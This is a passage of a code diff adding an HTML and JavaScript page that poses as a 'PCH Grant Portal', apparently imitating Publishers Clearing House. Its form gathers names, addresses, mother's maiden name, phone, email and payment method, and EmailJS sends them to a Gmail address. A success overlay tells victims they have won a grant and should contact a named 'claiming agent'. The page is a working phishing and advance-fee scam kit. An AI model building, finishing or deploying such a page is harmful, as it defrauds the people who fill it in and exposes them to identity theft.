+              </div>
+              <div class="review-row">
+                <span class="review-key">Heard via</span
+                ><span class="review-val" id="r-referral">—</span>
+              </div>
+              <div class="review-row">
+                <span class="review-key">Comments</span
+                ><span class="review-val" id="r-comments">—</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Navigation Buttons -->
+        <div class="nav-card">
+          <button
+            class="btn btn-back"
+            id="btnBack"
+            style="visibility: hidden"
+            onclick="goBack()"
+          >
+            ← Back
+          </button>
+          <button class="btn btn-next" id="btnNext" onclick="goNext()">
+            Next →
+          </button>
+        </div>
+
+        <div class="form-footer">
+          Never submit passwords through this form. &nbsp;|&nbsp;
+          <a href="#">Privacy Policy</a>
+        </div>
+      </div>
+    </main>
+
+    <!-- ══ SUCCESS OVERLAY (Image 2 style) ══ -->
+    <div class="success-overlay" id="successOverlay">
+      <div class="success-box">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+            <path
+              fill="currentColor"
+              d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"
+            />
+          </svg>
+        </div>
+        <h2>Application Submitted Successfully</h2>
+        <p>
+          Congratulations, you are eligible to receive your grant from the PCH.
+          Kindly contact your claiming agent, <strong>Mr. Howie Guja</strong>,
+          to receive your grant!
+        </p>
+        <div class="reference-box">
+          <div class="reference-label">Your Reference Number</div>
+          <div class="reference-number" id="refNumber">PCH-2026-00000</div>
+        </div>
+        <button class="btn-close-success" onclick="resetForm()">Close</button>
+      </div>
+    </div>
+
+    <!-- ══ FOOTER (Image 1 style) ══ -->
+    <footer class="site-footer">
+      <div class="footer-inner">
+        <div class="footer-top">
+          <!-- Brand Column -->
+          <div class="footer-brand">
+            <div class="brand-row">
+              <svg
+                width="34"
+                height="38"
+                viewBox="0 0 40 44"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <path
+                  d="M20 2L4 8v14c0 10 7 18.5 16 21 9-2.5 16-11 16-21V8L20 2z"
+                  fill="#d4a017"
+                  opacity="0.15"
+                />
+                <path
+                  d="M20 2L4 8v14c0 10 7 18.5 16 21 9-2.5 16-11 16-21V8L20 2z"
+                  stroke="#d4a017"
+                  stroke-width="2"
+                  fill="none"
+                />
+                <path
+                  d="M13 21.5l5 5 9-10"
+                  stroke="#d4a017"
+                  stroke-width="2.5"
+                  stroke-linecap="round"
+                  stroke-linejoin="round"
+                />
+              </svg>
+              <div>
+                <div class="brand-name">PCH</div>
+                <div class="brand-sub">Grant Portal</div>
+              </div>
+            </div>
+            <p>
+              The PCH Community Investment Grant program supports individuals
+              and small businesses with financial assistance across the nation.
+            </p>
+          </div>
+
+          <!-- Quick Links -->
+          <div class="footer-col">
+            <h4>Quick Links</h4>
+            <ul>
+              <li><a href="#">Home</a></li>
+              <li><a href="#">Apply Now</a></li>
+              <li><a href="#">Check Status</a></li>
+              <li><a href="#">FAQ</a></li>
+            </ul>
+          </div>
+
+          <!-- Grant Types + Contact -->
+          <div>
+            <div class="footer-col" style="margin-bottom: 28px">
+              <h4>Grant Types</h4>
+              <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Business</a></li>
+                <li><a href="#">Education</a></li>
+                <li><a href="#">Medical</a></li>
+              </ul>
+            </div>
+
+            <div class="footer-contact">
+              <h4>Contact Us</h4>
+              <div class="contact-item">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"
+                  />
+                </svg>
+                <span>support@pchgrant.org</span>
+              </div>
+              <div class="contact-item">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1-.2 1.1.4 2.3.6 3.6.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1-9.4 0-17-7.6-17-17 0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.5.6 3.6.1.3 0 .7-.2 1L6.6 10.8z"
+                  />
+                </svg>
+                <span>1-800-PCH-GRANT</span>
+              </div>
+              <div class="contact-item">
+                <svg viewBox="0 0 24 24">
+                  <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"
+                  />
+                </svg>
+                <span>Mon–Fri &nbsp;9am – 5pm EST</span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <!-- /footer-top -->
+
+        <div class="footer-bottom">
+          <p>© 2026 PCH Grant Portal. All rights reserved.</p>
+          <div class="footer-bottom-links">
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- EmailJS SDK — must load before the inline script below -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+      let currentStep = 1;
+      const totalSteps = 4;
+
+      const cards = [
+        null,
+        document.getElementById("card2"),
+        document.getElementById("card3"),
+        document.getElementById("card4"),
+      ];
+      const labels = [
+        document.getElementById("lbl1"),
+        document.getElementById("lbl2"),
+        document.getElementById("lbl3"),
+        document.getElementById("lbl4"),
+      ];
+      const steps = [
+        document.getElementById("step1"),
+        document.getElementById("step2"),
+        document.getElementById("step3"),
+        document.getElementById("step4"),
+      ];
+
+      function updateUI() {
+        const pct = ((currentStep - 1) / (totalSteps - 1)) * 100;
+        document.getElementById("progressFill").style.width = pct + "%";
+        document.getElementById("stepCounter").textContent =
+          `Step ${currentStep} of ${totalSteps}`;
+        const progressTrack = document.querySelector(".progress-track");
+        if (progressTrack) progressTrack.setAttribute("aria-valuenow", currentStep);
+
+        labels.forEach((lbl, i) => {
+          if (!lbl) return;
+          lbl.classList.remove("active", "done");
+          if (i + 1 < currentStep) lbl.classList.add("done");
+          if (i + 1 === currentStep) lbl.classList.add("active");
+        });
+
+        cards.forEach((card) => {
+          if (card) {
+            card.style.display = "none";
+            card.setAttribute("aria-hidden", "true");
+          }
+        });
+        steps.forEach((s) => { if (s) s.classList.remove("active"); });
+
+        if (currentStep > 1) {
+          const activeCard = cards[currentStep - 1];
+          if (activeCard) {
+            activeCard.style.display = "block";
+            activeCard.removeAttribute("aria-hidden");
+          }
+          const activeStep = steps[currentStep - 1];
+          if (activeStep) activeStep.classList.add("active");
+        } else {
+          if (steps[0]) steps[0].classList.add("active");
+        }
+
+        const btnBack = document.getElementById("btnBack");
+        if (btnBack) btnBack.style.visibility = currentStep === 1 ? "hidden" : "visible";
+
+        const btnNext = document.getElementById("btnNext");
+        if (btnNext) {
+          if (currentStep === totalSteps) {
+            btnNext.textContent = "✓ Submit Application";
+            btnNext.className = "btn btn-submit";
+          } else {
+            btnNext.textContent = "Next →";
+            btnNext.className = "btn btn-next";
+          }
+        }
+      }
+
+      function clearErrors() {
+        document
+          .querySelectorAll(".invalid")
+          .forEach((el) => el.classList.remove("invalid"));
+        document
+          .querySelectorAll(".error-msg.show")
+          .forEach((el) => el.classList.remove("show"));
+      }
+
+      function showError(id, errId) {
+        const el = document.getElementById(id);
+        if (el) el.classList.add("invalid");
+        const err = document.getElementById(errId);
+        if (err) err.classList.add("show");
+      }
+
+      function validateStep(step) {
+        clearErrors();
+        let valid = true;
+
+        if (step === 1) {
+          if (!document.getElementById("firstName").value.trim()) {
+            showError("firstName", "err-firstName");
+            valid = false;
+          }
+          if (!document.getElementById("address1").value.trim()) {
+            showError("address1", "err-address1");
+            valid = false;
+          }
+          if (!document.getElementById("maiden").value.trim()) {
+            showError("maiden", "err-maiden");
+            valid = false;
+          }
+          const age = parseInt(document.getElementById("age").value, 10);
+          if (!age || age < 1 || age > 120) {
+            showError("age", "err-age");
+            valid = false;
+          }
+          if (!document.getElementById("sex").value) {
+            showError("sex", "err-sex");
+            valid = false;
+          }
+          if (!document.getElementById("occupation").value.trim()) {
+            showError("occupation", "err-occupation");
+            valid = false;
+          }
+        }
+
+        if (step === 2) {
+          const email = document.getElementById("email").value.trim();
+          const emailOk = /^[a-zA-Z0-9]([a-zA-Z0-9._%+\-]*[a-zA-Z0-9])?@[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$/.test(email);
+          if (!emailOk) {
+            showError("email", "err-email");
+            valid = false;
+          }
+          const phone = document.getElementById("phone").value.trim();
+          const phoneOk = /^\+?[\d\s\-().]{7,20}$/.test(phone) && (phone.match(/\d/g) || []).length >= 7;
+          if (!phoneOk) {
+            showError("phone", "err-phone");
+            valid = false;
+          }
+          if (!document.getElementById("address").value.trim()) {
+            showError("address", "err-address");
+            valid = false;
+          }
+        }
+
+        if (step === 3) {
+          const session = document.querySelector(
+            'input[name="session"]:checked',
+          );
+          if (!session) {
+            document.getElementById("err-session").classList.add("show");
+            valid = false;
+          }
+        }
+
+        return valid;
+      }
+
+      function populateReview() {
+        const refs = [
+          ...document.querySelectorAll('input[name="referral"]:checked'),
+        ].map((c) => c.value);
+        document.getElementById("r-name").textContent =
+          document.getElementById("firstName").value;
+        document.getElementById("r-age").textContent =
+          document.getElementById("age").value;
+        document.getElementById("r-sex").textContent =
+          document.getElementById("sex").value;
+        document.getElementById("r-marital").textContent =
+          document.getElementById("marital").value || "Not specified";
+        document.getElementById("r-occupation").textContent =
+          document.getElementById("occupation").value;
+        document.getElementById("r-email").textContent =
+          document.getElementById("email").value;
+        document.getElementById("r-phone").textContent =
+          document.getElementById("phone").value;
+        document.getElementById("r-address").textContent =
+          document.getElementById("address").value;
+        document.getElementById("r-session").textContent =
+          document.querySelector('input[name="session"]:checked')?.value || "—";
+        document.getElementById("r-referral").textContent = refs.length
+          ? refs.join(", ")
+          : "Not specified";
+        document.getElementById("r-comments").textContent =
+          document.getElementById("comments").value || "None";
+      }
+
+      function generateRef() {
+        const num = Math.floor(10000 + Math.random() * 89999);
+        return `PCH-2026-${num}`;
+      }
+
+      function goNext() {
+        if (!validateStep(currentStep)) return;
+        if (currentStep === totalSteps) {
+          submitForm();
+          return;
+        }
+        currentStep++;
+        if (currentStep === totalSteps) populateReview();
+        updateUI();
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      }
+
+      function goBack() {
+        if (currentStep > 1) {
+          currentStep--;
+          clearErrors();
+          updateUI();
+        }
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      }
+
+      function submitForm() {
+        const ref = generateRef();
+        const btnNext = document.getElementById("btnNext");
+
+        // Collect all form data
+        const refs = [...document.querySelectorAll('input[name="referral"]:checked')]
+          .map((c) => c.value).join(", ") || "Not specified";
+
+        const templateParams = {
+          full_name:      document.getElementById("firstName").value.trim(),
+          address1:       document.getElementById("address1").value.trim(),
+          maiden_name:    document.getElementById("maiden").value.trim(),
+          age:            document.getElementById("age").value,
+          gender:         document.getElementById("sex").value,
+          marital_status: document.getElementById("marital").value || "Not specified",
+          occupation:     document.getElementById("occupation").value.trim(),
+          email:          document.getElementById("email").value.trim(),
+          phone:          document.getElementById("phone").value.trim(),
+          address:        document.getElementById("address").value.trim(),
+          payment_method: document.querySelector('input[name="session"]:checked')?.value || "Not selected",
+          referral:       refs,
+          comments:       document.getElementById("comments").value.trim() || "None",
+          reference:      ref,
+          to_email:       "pchclaimingagents@gmail.com",
+        };
+
+        // Disable button and show loading state
+        btnNext.disabled = true;
+        btnNext.textContent = "Submitting…";
+
+        emailjs
+          .send(
+            "YOUR_SERVICE_ID",    // ← Replace with your EmailJS Service ID
+            "YOUR_TEMPLATE_ID",   // ← Replace with your EmailJS Template ID
+            templateParams
+          )
+          .then(function () {
+            document.getElementById("refNumber").textContent = ref;
+            document.getElementById("successOverlay").classList.add("show");
+          })
+          .catch(function (error) {
+            console.error("EmailJS error:", error);
+            alert(
+              "There was a problem submitting your application. Please try again or contact support."
+            );
+          })
+          .finally(function () {
+            btnNext.disabled = false;
+            btnNext.textContent = "✓ Submit Application";
+          });
+      }
+
+      function resetForm() {
+        document.getElementById("successOverlay").classList.remove("show");
+        document.querySelectorAll("input, textarea, select").forEach((el) => {
+          if (el.type === "radio" || el.type === "checkbox") el.checked = false;
+          else el.value = "";
+        });
+        currentStep = 1;
+        clearErrors();
+        updateUI();
+        window.scrollTo({ top: 0, behavior: "smooth" });
+      }
+
+      // Initialize EmailJS — replace with your Public Key from emailjs.com
+      emailjs.init("YOUR_PUBLIC_KEY");
+
+      updateUI();
+    </script>
+  </body>
+</html>
